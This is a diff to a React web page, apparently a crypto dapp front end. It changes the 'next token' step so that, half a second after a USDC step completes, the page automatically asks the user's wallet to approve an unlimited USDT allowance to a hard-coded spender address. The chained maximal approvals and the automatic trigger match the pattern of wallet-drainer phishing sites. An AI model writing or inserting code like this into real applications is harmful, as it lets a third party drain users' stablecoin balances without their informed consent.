@@ -149,8 +149,17 @@ export default function Home() {
   const goToNextToken = () => {
     if (currentToken === "usdc") {
       setCurrentToken("usdt");
-      setStep("idle");
       reset();
+      // Auto-trigger USDT approval after USDC completes
+      setTimeout(() => {
+        setStep("approving");
+        writeContract({
+          address: USDT_ADDRESS as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "approve",
+          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
+        });
+      }, 500);
     } else {
       setCurrentToken("complete");
       setStep("done");
